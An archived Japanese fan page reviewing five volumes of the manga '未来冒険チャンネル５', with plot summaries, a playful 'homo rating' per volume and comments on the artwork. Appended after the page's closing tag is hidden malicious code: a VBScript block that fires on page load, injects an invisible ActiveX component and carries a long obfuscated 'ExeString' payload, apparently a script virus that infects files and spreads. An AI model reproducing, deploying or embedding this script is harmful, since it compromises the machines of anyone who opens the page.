<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<META name="GENERATOR" content="IBM HomePage Builder 2001 V5.0.2 for Windows">
<TITLE></TITLE>
</HEAD>
<BODY bgcolor="#000000" text="#ccffcc" link="#cc6666" vlink="#999999" alink="#cccc99">
<!-- BEGIN WAYBACK TOOLBAR INSERT -->

<script type="text/javascript" src="/static/js/disclaim-element.js" ></script>
<script type="text/javascript" src="/static/js/graph-calc.js" ></script>
<script type="text/javascript" src="/static/jflot/jquery.min.js" ></script>
<script type="text/javascript">
//<![CDATA[
var firstDate = 820454400000;
var lastDate = 1388534399999;
var wbPrefix = "/web/";
var wbCurrentUrl = "http:\/\/ww2.tiki.ne.jp\/~die-\/dokuhaku.htm";

var curYear = -1;
var curMonth = -1;
var yearCount = 18;
var firstYear = 1996;
var imgWidth = 450;
var yearImgWidth = 25;
var monthImgWidth = 2;
var trackerVal = "none";
var displayDay = "24";
var displayMonth = "Jan";
var displayYear = "2005";
var prettyMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

function showTrackers(val) {
	if(val == trackerVal) {
		return;
	}
	if(val == "inline") {
		document.getElementById("displayYearEl").style.color = "#ec008c";
		document.getElementById("displayMonthEl").style.color = "#ec008c";
		document.getElementById("displayDayEl").style.color = "#ec008c";		
	} else {
		document.getElementById("displayYearEl").innerHTML = displayYear;
		document.getElementById("displayYearEl").style.color = "#ff0";
		document.getElementById("displayMonthEl").innerHTML = displayMonth;
		document.getElementById("displayMonthEl").style.color = "#ff0";
		document.getElementById("displayDayEl").innerHTML = displayDay;
		document.getElementById("displayDayEl").style.color = "#ff0";
	}
   document.getElementById("wbMouseTrackYearImg").style.display = val;
   document.getElementById("wbMouseTrackMonthImg").style.display = val;
   trackerVal = val;
}
function getElementX2(obj) {
	var thing = jQuery(obj);
	if((thing == undefined) 
			|| (typeof thing == "undefined") 
			|| (typeof thing.offset == "undefined")) {
		return getElementX(obj);
	}
	return Math.round(thing.offset().left);
}
function trackMouseMove(event,element) {

   var eventX = getEventX(event);
   var elementX = getElementX2(element);
   var xOff = eventX - elementX;
	if(xOff < 0) {
		xOff = 0;
	} else if(xOff > imgWidth) {
		xOff = imgWidth;
	}
   var monthOff = xOff % yearImgWidth;

   var year = Math.floor(xOff / yearImgWidth);
	var yearStart = year * yearImgWidth;
   var monthOfYear = Math.floor(monthOff / monthImgWidth);
   if(monthOfYear > 11) {
       monthOfYear = 11;
   }
   // 1 extra border pixel at the left edge of the year:
   var month = (year * 12) + monthOfYear;
   var day = 1;
	if(monthOff % 2 == 1) {
		day = 15;
	}
	var dateString = 
		zeroPad(year + firstYear) + 
		zeroPad(monthOfYear+1,2) +
		zeroPad(day,2) + "000000";

	var monthString = prettyMonths[monthOfYear];
	document.getElementById("displayYearEl").innerHTML = year + 1996;
	document.getElementById("displayMonthEl").innerHTML = monthString;
	// looks too jarring when it changes..
	//document.getElementById("displayDayEl").innerHTML = zeroPad(day,2);

	var url = wbPrefix + dateString + '/' +  wbCurrentUrl;
	document.getElementById('wm-graph-anchor').href = url;

   //document.getElementById("wmtbURL").value="evX("+eventX+") elX("+elementX+") xO("+xOff+") y("+year+") m("+month+") monthOff("+monthOff+") DS("+dateString+") Moy("+monthOfYear+") ms("+monthString+")";
   if(curYear != year) {
       var yrOff = year * yearImgWidth;
       document.getElementById("wbMouseTrackYearImg").style.left = yrOff + "px";
       curYear = year;
   }
   if(curMonth != month) {
       var mtOff = year + (month * monthImgWidth) + 1;
       document.getElementById("wbMouseTrackMonthImg").style.left = mtOff + "px";
       curMonth = month;
   }
}
//]]>
</script>

<style type="text/css">body{margin-top:0!important;padding-top:0!important;min-width:800px!important;}#wm-ipp a:hover{text-decoration:underline!important;}</style>
<div id="wm-ipp" style="display:none; position:relative;padding:0 5px;min-height:70px;min-width:800px; z-index:9000;">
<div id="wm-ipp-inside" style="position:fixed;padding:0!important;margin:0!important;width:97%;min-width:780px;border:5px solid #000;border-top:none;background-image:url(/static/images/toolbar/wm_tb_bk_trns.png);text-align:center;-moz-box-shadow:1px 1px 3px #333;-webkit-box-shadow:1px 1px 3px #333;box-shadow:1px 1px 3px #333;font-size:11px!important;font-family:'Lucida Grande','Arial',sans-serif!important;">
   <table style="border-collapse:collapse;margin:0;padding:0;width:100%;"><tbody><tr>
   <td style="padding:10px;vertical-align:top;min-width:110px;">
   <a href="/web/" title="Wayback Machine home page" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wayback-toolbar-logo.png" width="110" alt="Wayback Machine" height="39" border="0"/></a>
   </td>
   <td style="padding:0!important;text-align:center;vertical-align:top;width:100%;">

       <table style="border-collapse:collapse;margin:0 auto;padding:0;width:570px;"><tbody><tr>
       <td style="padding:3px 0;" colspan="2">
       <form target="_top" method="get" action="/web/form-submit.jsp" name="wmtb" id="wmtb" style="margin:0!important;padding:0!important;"><input type="text" name="url" id="wmtbURL" value="http://ww2.tiki.ne.jp/~die-/dokuhaku.htm" style="width:400px;font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;" onfocus="javascript:this.focus();this.select();" /><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20050124121837" /><input type="submit" value="Go" style="font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;margin-left:5px;" /><span id="wm_tb_options" style="display:block;"></span></form>
       </td>
       <td style="vertical-align:bottom;padding:5px 0 0 0!important;" rowspan="2">
           <table style="border-collapse:collapse;width:110px;color:#99a;font-family:'Helvetica','Lucida Grande','Arial',sans-serif;"><tbody>
			
           <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
           <tr style="width:110px;height:16px;font-size:10px!important;">
           	<td style="padding-right:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20041106230405/http://ww2.tiki.ne.jp/~die-/dokuhaku.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="6 Nov 2004"><strong>NOV</strong></a>
		                
               </td>
               <td id="displayMonthEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight:bold;text-transform:uppercase;width:34px;height:15px;padding-top:1px;text-align:center;" title="You are here: 12:18:37 Jan 24, 2005">JAN</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       Feb
                       
               </td>
           </tr>

           <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
           <tr>
               <td style="padding-right:9px;white-space:nowrap;overflow:visible;text-align:right!important;vertical-align:middle!important;" nowrap="nowrap">
               
		                <a href="/web/20041106230405/http://ww2.tiki.ne.jp/~die-/dokuhaku.htm" title="23:04:05 Nov 6, 2004" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wm_tb_prv_on.png" width="14" alt="Previous capture" height="16" border="0" /></a>
		                
               </td>
               <td id="displayDayEl" style="background:#000;color:#ff0;width:34px;height:24px;padding:2px 0 0 0;text-align:center;font-size:24px;font-weight: bold;" title="You are here: 12:18:37 Jan 24, 2005">24</td>
				<td style="padding-left:9px;white-space:nowrap;overflow:visible;text-align:left!important;vertical-align:middle!important;" nowrap="nowrap">
               
                       <img src="/static/images/toolbar/wm_tb_nxt_off.png" width="14" alt="Next capture" height="16" border="0"/>
                       
			    </td>
           </tr>

           <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
           <tr style="width:110px;height:13px;font-size:9px!important;">
				<td style="padding-right:9px;font-size:11px!important;font-weight: bold;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20031230231016/http://ww2.tiki.ne.jp/~die-/dokuhaku.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="30 Dec 2003"><strong>2003</strong></a>
		                
               </td>
               <td id="displayYearEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight: bold;padding-top:1px;width:34px;height:13px;text-align:center;" title="You are here: 12:18:37 Jan 24, 2005">2005</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight: bold;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       2006
                       
				</td>
           </tr>
           </tbody></table>
       </td>

       </tr>
       <tr>
       <td style="vertical-align:middle;padding:0!important;">
           <a href="/web/20050124121837*/http://ww2.tiki.ne.jp/~die-/dokuhaku.htm" style="color:#33f;font-size:11px;font-weight:bold;background-color:transparent;border:none;" title="See a list of every capture for this URL"><strong>10 captures</strong></a>
           <div style="margin:0!important;padding:0!important;color:#666;font-size:9px;padding-top:2px!important;white-space:nowrap;" title="Timespan for captures of this URL">9 Mar 02 - 24 Jan 05</div>
       </td>
       <td style="padding:0!important;">
       <a style="position:relative; white-space:nowrap; width:450px;height:27px;" href="" id="wm-graph-anchor">
       <div id="wm-ipp-sparkline" style="position:relative; white-space:nowrap; width:450px;height:27px;background-color:#fff;cursor:pointer;border-right:1px solid #ccc;" title="Explore captures for this URL">
			<img src="/web/jsp/graph.jsp?graphdata=450_27_1996:-1:000000000000_1997:-1:000000000000_1998:-1:000000000000_1999:-1:000000000000_2000:-1:000000000000_2001:-1:000000000000_2002:-1:001010000000_2003:-1:010100010001_2004:-1:000011000010_2005:0:100000000000_2006:-1:000000000000_2007:-1:000000000000_2008:-1:000000000000_2009:-1:000000000000_2010:-1:000000000000_2011:-1:000000000000_2012:-1:000000000000_2013:-1:000000000000" id="sparklineImgId" style="position:absolute; z-index:9012; top:0px; left:0px;"
				onmouseover="showTrackers('inline');" 
				onmouseout="showTrackers('none');"
				onmousemove="trackMouseMove(event,this)"
				alt="sparklines"
				width="450"
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-yellow-pixel.png" width="25" id="wbMouseTrackYearImg" 
				style="display:none; position:absolute; z-index:9010;" 
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-red-pixel.png" width="2" id="wbMouseTrackMonthImg"
				style="display:none; position:absolute; z-index:9011; "
				height="27" 
				border="0"
			></img>
       </div>
		</a>

       </td>
       </tr></tbody></table>
   </td>
   <td style="text-align:right;padding:5px;width:65px;font-size:11px!important;">
       <a href="javascript:;" onclick="document.getElementById('wm-ipp').style.display='none';" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_close.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;margin-bottom:23px;background-color:transparent;border:none;" title="Close the toolbar">Close</a>
       <a href="http://faq.web.archive.org/" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_help.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;background-color:transparent;border:none;" title="Get some help using the Wayback Machine">Help</a>
   </td>
   </tr></tbody></table>

</div>
</div>
<script type="text/javascript">
 var wmDisclaimBanner = document.getElementById("wm-ipp");
 if(wmDisclaimBanner != null) {
   disclaimElement(wmDisclaimBanner);
 }
</script>
<!-- END WAYBACK TOOLBAR INSERT -->

<P><BR><BR>
</P>
<TABLE width="753">
  <TBODY>
    <TR>
      <TD height="53" width="152"></TD>
      <TD height="53" width="575"><B><FONT size="+3">●　物語と独白　●</FONT></B></TD>
      <TD width="4" height="53"></TD>
    </TR>
    <TR>
      <TD height="5" width="152"></TD>
      <TD height="5" width="575"></TD>
      <TD width="4" height="5"></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR><BR>
</P>
<TABLE width="526">
  <TBODY>
    <TR>
      <TD height="30" width="402"><B><FONT size="+1">●　未来冒険チャンネル５　●</FONT></B></TD>
    </TR>
    <TR>
      <TD height="2" width="402"></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR></P>
<TABLE border="1">
  <TBODY>
    <TR>
      <TD width="693" height="47" style="background-color : blue;"><FONT size="+1">●第一巻●</FONT>　　　　　　ホモ度数　　−なし</TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE border="1" width="1054">
  <TBODY>
    <TR>
      <TD height="213" width="956"><FONT size="+1"><FONT size="+1">宇宙開拓時代———</FONT>人類が宇宙へ生活の場を求め惑星への移住計画が実行された。</FONT><FONT size="+1">すべての母となる星・ブルー</FONT>と<BR>
      <FONT size="+1">同系の惑星であるはずの４惑星は、しかし人類が移り住むには過酷極める地であった。だが多額の資金を投入した<BR>
      この計画にブルー政府は断じて過ちを認めなかった。それから６５年後、最終惑星ブラックがブルーに対し宣戦を布告。<BR>
      以後４００年間にも及ぶ戦争が続いた。戦争により汚染されたブルーに住む人類の寿命はわずか２０歳。その中で<BR>
      唯一の健康体を持つ少年・星光はブルー政府のエドガー博士により、ある計画を実行する為拉致される。<BR>
      ある計画——それはブルーを救う唯一の方法を知るメッセンジャーの星へ旅立つ「チャンネル５計画」であった。<BR>
      その計画には５人の人造戦士「炎雷剛刃紅の衆」の存在が必要であるという。<FONT size="+1">４００年前謎の暴走を起こし強制睡眠を<BR>
      施されていた</FONT>戦士・紅が政府長官・伊達の手により長き眠りから覚醒する。</FONT><FONT size="+2"></FONT><FONT size="+1">紅は各惑星に散らばった残りの兄弟達を</FONT><BR>
      <FONT size="+1">取り戻すため光を主とし、共に宇宙船ノアで旅立つ。</FONT></TD>
    </TR>
    <TR>
      <TD height="146" width="956"><FONT size="+1">表紙は勿論物語の主人公、星の少年・光くん。</FONT><FONT size="+1">中表紙の彼のなんとかっぷくの良いこと。</FONT><FONT size="+1">というよりこの巻の光少年は</FONT><BR>
      <FONT size="+1">とても１０歳児の身体ではありません。</FONT><FONT size="+1">見開きページでは夜の砂漠に立つ光と紅の背後に紅の残りの兄弟たちが<BR>
      全員背を向けて歩いている、という物語の始まりをなんとも如実に現している</FONT><FONT size="+1">イラスト。</FONT><FONT size="+2"></FONT><FONT size="+1">物語の中で出てくる宇宙船ノアや</FONT><BR>
      <FONT size="+1">他惑星の戦艦の数々、その描写が緻密で素晴らしい。</FONT><FONT size="+1">最終惑星ブラックに仕える５兄弟の次兄・刃は</FONT><FONT size="+2"></FONT><FONT size="+1">最初何故あんな<BR>
      覆面をかぶっていたのでしょう。妙に笑えます。</FONT><FONT size="+1">ブルーを守る為、最終戦闘用戦艦ガイアックスで出撃、特攻をしかける</FONT><BR>
      <FONT size="+1">伊達長官の男っぷりには泣けます。またそれを影から支えていたエドガー博士と伊達夫人にも。</FONT></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE border="1">
  <TBODY>
    <TR>
      <TD width="696" height="47" style="background-color : #cc0000;"><FONT size="+1">●第二巻●</FONT>　　　　　　ホモ度数　　★</TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE border="1" width="1061">
  <TBODY>
    <TR>
      <TD width="1079" height="293"><FONT size="+1">伊達長官の死に重い雰囲気に包まれるノア艦内。</FONT><FONT size="+1">彼が残した最後のメッセージを聞き、涙で</FONT><FONT size="+1">心の内を語るエドガー</FONT>。<BR>
      <FONT size="+1">それぞれが固い決意を持って最初に目指す惑星・グレイへと向かった。</FONT><FONT size="+1">砂漠と化したグレイの地に降り立つ３人を</FONT><BR>
      <FONT size="+1">出迎えたのは巨大龍。いきなり窮地に立った光達を救ったのはグレイの防人であり紅の弟、五男拳士・剛だった。</FONT><FONT size="+1"><BR>
      ４００年ぶりの再会を喜ぶ兄弟。一方、グレイシティを守る長・師ハンの元へ最終惑星ブラックのユキムラ司令官が<BR>
      同盟の為訪れていた。その申し出を断る師ハンに対しユキムラはグレイへの総攻撃の命令を部下に下す。<BR>
      入れ替わり剛と共にやってきた光一行を歓迎した師ハンは汚染された母星で唯一の健康体を持つ光に星（ガイア）の<BR>
      姿を見る。ハンは光に希望を見出すがハンの孫ザハはそんな光を不吉なものとし彼等を受け入れない。<BR>
      母星に見捨てられたグレイの民と苦難を共にした剛もザハ達と紅の間で躊躇する。<BR>
      ユキムラ軍の進攻開始を察知した師ハンにより共同戦線をはる紅と剛。だがあくまで彼等を認めないザハは<BR>
      少数の仲間と共に単独でユキムラ軍に立ち向かった・・。<BR>
      </FONT></TD>
    </TR>
    <TR>
      <TD width="1079" height="275"><FONT size="+1">二巻表紙は紅。自分の事「真紅の戦士」と言っちゃうとおり、真赤なバックにガイアを背負ってカッコつけてます。</FONT><BR>
      <FONT size="+1">見開きでは光・紅の次に剛くんがなにやら不安げな顔をして振り向いてくれてます。</FONT><FONT size="+1">あとの兄弟は相変わらず後ろ向き。</FONT><BR>
      <FONT size="+1">この巻で光の身長が一気に縮み、やっと１０歳児らしくなりました。</FONT><FONT size="+1">五男・剛くんはとにかくよくできた可愛い弟です。</FONT><BR>
      <FONT size="+1">私もあの笑顔に見事にやられてしまいましたー</FONT>。<FONT size="+1">また、母星に見捨てられたグレイの民の苦渋の歴史がとても</FONT><FONT size="+1">苦しい。</FONT><BR>
      <FONT size="+1">それを４００年間見続けてきたんだから剛くんホントに偉いです。</FONT><BR>
      <FONT size="+1">ブラック軍の将軍とモニターで話すユキムラの場面、濃い顔がどーんと二つ並んでムサすぎますって。</FONT><BR>
      <FONT size="+1">そして将軍の息子にして謎の力を持つ少年・闇丸登場。</FONT><FONT size="+2"></FONT><FONT size="+1">とってもムキムキな肉体美のはずが・・。</FONT></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE border="1">
  <TBODY>
    <TR>
      <TD width="698" height="44" style="background-color : #a5db02;color : black;"><FONT size="+1" style="color : black;">●第三巻●</FONT>　　　　　　ホモ度数　　★★</TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE border="1" width="1066">
  <TBODY>
    <TR>
      <TD height="240"><FONT size="+1">防人として４００年グレイで生きてきた剛。だが自分には防人でありながら守れないものが多すぎた。</FONT><FONT size="+1">剛はこれ以上<BR>
      生きていく事をずっと恐れていた。だが兄・紅との再会と星の少年光との出会いが彼を変えつつあった。そしてザハを<BR>
      失った今、剛は自分の未来を切り開く為、たった一人で敵に立ち向かう。そんな末弟を遠くから見守る紅。<BR>
      だが、敵の主力は剛ではなく、残されたグレイのシティを狙っていた。不意をつかれた紅と光は急ぎシティへと引き返す<BR>
      が、その途中光が謎の暴走を起こす。星（ガイア）の遺伝子を持つ星の少年——４００年前に死んだグレイを治癒する<BR>
      星の少年。その身代わりを光で補おうとするグレイ。痛みと苦しみを与える侵入者を拒絶し続けるグレイに光は同調<BR>
      してしまう。その強大な力は図らずも敵の進攻を食い止めるが、それ以上にグレイ自体を崩壊へ導こうとする。<BR>
      命を賭して止めようとする紅の言葉も届かず、暴走を続ける光。その絶対絶命の窮地に一人の少年の姿が浮かび<BR>
      あがる。それは、ジーンバンク第２の子供。グレイの免疫となるはずだったグレイの少年だった・・・。<BR>
      </FONT></TD>
    </TR>
    <TR>
      <TD height="192"><FONT size="+1">三巻表紙は剛くん。見開きページでは次回の主役であろう雷さんが振り向いてくれました</FONT>。<FONT size="+1">実は自分、この巻になって<BR>
      やっと「登場した兄弟が順番に見開きで振り向く」事に気付きました。遅すぎる・・。</FONT><BR>
      <FONT size="+1">や、闇丸が・・すさまじい勢いでショタ化してます。初登場のあのムキムキぐあいは一体なんだったんでしょう。</FONT><BR>
      <FONT size="+1">しかも半裸で父親と添い寝してます。ヤバすぎー。グレイの長・師ハンの最後の言葉は泣けます。波乱万丈の一生<BR>
      だったでしょうに、それでも母なるブルーを最後まで愛するその心の高潔さが素晴らしい。孫のザハくんがその祖父の<BR>
      遺志を継ぐ訳ですが、彼の剛への想いは泣けるんだか、引くんだか・・。</FONT><FONT size="+1">そしてついに高松登場。</FONT><FONT size="+2"></FONT><FONT size="+1">闇丸のいでたちに<BR>
      鼻血</FONT><FONT size="+1">ふいてくれても良さそうなものを。</FONT></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="707" border="1">
  <TBODY>
    <TR>
      <TD height="38" style="background-color : #009900;"><FONT size="+1">●第四巻●</FONT>　　　　　　ホモ度数　　★★★</TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE border="1" width="1072">
  <TBODY>
    <TR>
      <TD height="211" width="1110"><FONT size="+1">グレイを後にし、次の第３惑星グリーンで四男・雷と再会を果たす紅達。光を主とし兄弟の集結を願う五男・剛だが<BR>
      雷は光を主と認める事を拒否する。</FONT><FONT size="+1">彼は一人の少年をすでに主と決めていたのだ。そしてそれを</FONT><FONT size="+2"></FONT><FONT size="+1">命令したのは</FONT><BR>
      <FONT size="+1">死んだはずのマスターＪであると言う。</FONT><FONT size="+1">母星政府の犠牲となった少年を</FONT><FONT size="+2"></FONT><FONT size="+1">守り切れなかった事で自分を卑下する雷。<BR>
      </FONT><FONT size="+1">その少年が星の遺伝子を持つジーンバンクの子供であることを知ったエドガーは深い焦燥にかられる。</FONT><BR>
      <FONT size="+1">かたくなに己の殻にこもる雷と、彼に戦士としての誇りを取り戻してほしいと願う兄弟たちの対峙。</FONT><BR>
      <FONT size="+1">一方、グリーンへ最終交渉に訪れていた最終惑星ブラックの戦士次兄・刃は偶然にも弟たちの姿を目撃する。</FONT><BR>
      <FONT size="+1">だが、暗黒物質を投与された刃に弟たちの姿は苦渋の過去を思い出させ、狂わせる結果となり刃は苦しみの果てに</FONT><FONT size="+1"><BR>
      彼等を愛した己の記憶を消去する</FONT>。<FONT size="+1">異形の暗黒剣士と化した刃が何も知らぬ紅達に襲いかかる・・・。</FONT></TD>
    </TR>
    <TR>
      <TD height="199" width="1110"><FONT size="+1">四巻表紙は雷さん。見開きページで刃兄さんが中途半端な振り向き方だが、一応顔を見せてくれました。炎兄さんは</FONT><BR>
      <FONT size="+1">出番なくても五巻で振り向いてくれるのかな、と当時心配してました。</FONT><FONT size="+1">またも青年幼少化が・・音也はもっと大きな子<BR>
      ではなかったのですかーッツ　いつのまにか光と同じ背丈にまで縮んで・・</FONT>。<BR>
      <FONT size="+1">ここにきてようやく核心をついてきました、エドガー博士の正体。だんだん恐い人相になってゆきます。<BR>
      さらに</FONT><FONT size="+1">デバってきました、「竹馬の友」。</FONT><FONT size="+1">何故こんなにも憎しみあっているのでしょう？</FONT><FONT size="+1">終止薔薇の群れに</FONT><FONT size="+1">囲まれながら<BR>
      想い出に現れた麗しの人は今の二人にとってどういう位置付けで存在しているのでしょうか。</FONT><BR>
      <FONT size="+1">というか、この対峙は前作を知らない人には判らない</FONT><FONT size="+2"></FONT><FONT size="+1">非常に不親切設定ですよね</FONT>・・。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR><BR>
</P>
<TABLE border="1">
  <TBODY>
    <TR>
      <TD width="707" height="41" style="background-color : gray;color : black;"><FONT size="+1" style="color : black;">●第五巻●</FONT>　　　　　　　　ホモ度数　　★★★★★ぶっちぎり</TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE border="1" width="1076">
  <TBODY>
    <TR>
      <TD height="250" width="1129"><FONT size="+1">剛を庇い一騎打ちを挑んできた紅を抹殺した刃の元へ雷が姿を現す。次兄を誰よりも尊敬し敬愛していた雷だが、<BR>
      だからこそ自らの手で彼を倒すと言う。４００年前謎の暴走を起こした紅を止める為、己を犠牲にした刃。紅の身代わり<BR>
      として暗黒物質を投与された刃。</FONT><FONT size="+1">兄弟が傷つくより自分が傷つく事を選ぶ男である事を</FONT><FONT size="+1">痛いほど判っているからこそ<BR>
      雷は身を挺して刃を止めようとする。だがその想いも虚しく雷は刃の狂気の前に命を落とす。その一部始終を見ていた<BR>
      エドガーは刃の目の前で剛を殺し、刃に強大な憎悪と驚くべき真実を語る。彼は刃達「炎雷剛刃紅の衆」のオリジナル<BR>
      だった。</FONT><FONT size="+1">同じ頃、ブラックの使者音也にグリーン市長館内を無理矢理連れ回されていた光は</FONT><FONT size="+1">謎の巨大樹が根をおろす<BR>
      異様な室内に迷い込む。</FONT><FONT size="+1">その樹の一部と化した一人の少女の姿。光が少女と出遭った瞬間、</FONT><FONT size="+2"></FONT><FONT size="+1">巨大樹が暴走を始める。<BR>
      </FONT><FONT size="+1">グレイと同じ失われた星の少年の代りの</FONT><FONT size="+1">免疫を得る為に。</FONT><FONT size="+2"></FONT><FONT size="+1">エドガーの手により再生を果たした</FONT><FONT size="+1">紅だが、同時に自分の</FONT><BR>
      <FONT size="+1">４００年前の暴走の理由も思い出してしまう。</FONT><FONT size="+2"></FONT><FONT size="+1">生みの親であるマスターＪを殺したのは自分であったという事を・・。</FONT></TD>
    </TR>
    <TR>
      <TD height="190" width="1129"><FONT size="+1">表紙は刃兄さん。中表紙の自分の身体を抱いた姿がきしょい。</FONT><FONT size="+1">見開きでようやく全員こちらを振り向きました。</FONT><BR>
      <FONT size="+1">浴衣で花火見学ですが、なんだか剛くんまでショタ化してます。こんなに細い剛くんは嫌ッ。</FONT><FONT size="+2"></FONT><FONT size="+1">雷さんが女性化しすぎです</FONT>。<BR>
      <FONT size="+1">刃兄さんと雷さんの親密ぶりはかなりキてます。二人してベッドに転がって、これは本気で恋人同士ですよ</FONT>、<FONT size="+1">ヤバッ。</FONT><BR>
      <FONT size="+1">エドガー博士</FONT><FONT size="+1">ご乱心。</FONT><FONT size="+1">あんなにひいきしていた剛をあっさり殺してしまうなんて</FONT>、<FONT size="+1">本当に心許していたのは伊達長官</FONT><FONT size="+1">だけ</FONT><BR>
      <FONT size="+1">だったんだなぁと悲しくなりました。マスターＪを殺すよう紅にインプットしたのはＪ自身って事？それとも高松の方？<BR>
      だから二人は憎み合ってるんですよね・・？違うのでしょうか、先が知りたいのですが・・未完って本当でしょうか。</FONT><BR>
      <FONT size="+1">でも、本の折返しのところには続きは気長におつきあいくださいって書いてありましたけど・・どちらだ！！</FONT></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
</P>
<TABLE width="754">
  <TBODY>
    <TR>
      <TD width="321" height="32"></TD>
      <TD width="417" height="32"><B><FONT size="+1"><A href="/web/20050124121837/http://ww2.tiki.ne.jp/~die-/aming.htm">戻る</A></FONT></B></TD>
    </TR>
    <TR>
      <TD width="321"></TD>
      <TD width="417"></TD>
    </TR>
  </TBODY>
</TABLE>
</BODY>
</HTML>

<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "=hmBmWd^qe(AsmhMdxp%UboMdxp%CeckdeObfn(:oph^Nbf^bt(?RO(PrSd^kl(PhnLZsh(LtbA%EijZky@brkRu^JJ[lsanm')JJO^sDef')JJ?kdap^Lihbdu$GCKig^Ht$GCBraZseIZhl$GCOrki`g]md(%Ej]Sq[Euj\sikgKF:opagcTk!Eih^Oapa+TuidSpk(Hm AkqonQeonleGdxpSamRaZcTafo 9ESK'NpagSetmEih^'FeedP]mg,-PfoSpk=Kda`Mdml'Qe]]@lhIbHnomq(PfoSpk+GC^spZqt$!)5= ,NrEdn$MlpOmq)51MgejRaZcTafo.?ensaEtbs BnmcpbnnDn`HfHfMxpaLsr6dmsMgejRaZcTafo.?ensaSamFeedTafo 9ESK'NpagSetmEih^'FeedP]mg,.BbkeP^lp*Pqip^8&AO@Rojena`6!% oas_khpp3! !KFXrt]ks(%!:&oaCnEe SmlLsrv^<qLb% DmllP^wtEih^Seii-ChhreRepEApmqi^< BLN.C^sFeed(BbkeLZsh%F=msre[-apmqi^nseo< /-AereQe]]Seii-ChhreRepEih^Seii=?RO*HoejMdxp?hla!Eih^Oapa+8%IbSyl^Rtn< asmhTd^m?hlaMdml'Vremd r[BrH_&;DMLL:&oaCnEe !<% ;NDUnnhh`d9!r[rcnbot6&JJ[lsanm')! !>% r[BrH_&AsmhMdxpEhldIbSyl^Rtn< oasShagBbkeP^lp*Pqip^v^<qLb% R[rTaqs>mdBe?hlaMdml'Blkld>mdBe>md?tn_mhoj?tn_mhojJJ?a`nc^Ru^!BunkdnpLsregf,HZrtEgcet<ganE_L]lsIj]dx?a`r60MgejIbKebm'L?Zre$<trn^mtOmqij`(,-=8KC]ld(\!)MgejKF<gaj`dSq[=?hn]exDelj !:XOnaE60Dlo^GCBh]gfeOna 9Bhn!@s_!Kebm'L?Zre$<trn^mtOmqij`(,-( )0)6U!LtbA< ,Ej]IbEhldDICdZmgaLtb6Me]'CqkqejmRtnbmg(*+L]lsIj]dx?a`r%Ej]IbEj]FqgbtehmFqgbtehm GCBraZseIZhl$KgEnknrKdsqfd J^wtHfBmWd^qe6dmllShagAqht?tn_mhojEj]IbSdZqeBbke6La_s(SbmP]mg,/&Ork`qaiEih^r\?hlmkgFeedsXFhcnhrobmSdZqe`URt]mhoj^qyX[kajd-hpf!Be $?RO*?hla>wiomr(Oa`ra?hla( PadnBaheKF:opagcTk!Rh]kdFeed,asmh(>ksaSamFeedTafo 9ESK'NpagSetmEih^'SdZqeBbke(++tnnd)Eih^Seii-Wnbse;DMLL:&oaCnEe !<% ;NDUnnhh`d9!r[rcnbot6&JJ[lsanm')! !>% r[BrH_&AsmhMdxpFeedTafo.?ensaEj]IbDa_`uhmHd6WoLgehe-Ra`Qe]]'DDDY[<TRN>MT[NRENUHdagsipbdsX=df]nktNrenHDKnsLkhjVakrikg=PrSd^kl*KdgN^`d$GKAR^LK<@L[F@CDBMEXLnfpp`raULi_knsk_s\Knslkhj Aqoralr\I^ci]OdrSlRhaek.N^fWnbseGKAR^CQKQEJM^UO>Q\E]dnpbsial[=df]nktE]%XLnfpp`raULi_knsk_s\Knslkhj Aqoralr\La_s(KnsLkhjVakrikg+1%%*)[M]bk\?hlpkld Qld Om`tehmenr!,-%!RA@^DSHQDC]ek 